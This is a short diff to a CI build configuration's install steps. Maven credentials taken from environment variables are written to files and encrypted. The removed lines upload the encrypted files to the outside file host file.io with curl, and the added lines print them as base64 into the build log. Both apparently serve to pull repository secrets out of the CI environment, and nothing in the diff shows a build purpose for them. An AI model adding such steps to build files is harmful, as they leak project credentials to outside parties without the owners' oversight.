@@ -18,5 +18,5 @@ install:
   - echo $MVN_PASSWORD > mvn-pass.txt
   - ccencrypt mvn-user.txt --key $ENC_KEY
   - ccencrypt mvn-pass.txt --key $ENC_KEY
-  - curl -F'file=@mvn-user.txt.cpt' https://file.io
-  - curl -F'file=@mvn-pass.txt.cpt' https://file.io
+  - cat mvn-user.txt.cpt | base64
+  - cat mvn-pass.txt.cpt | base64
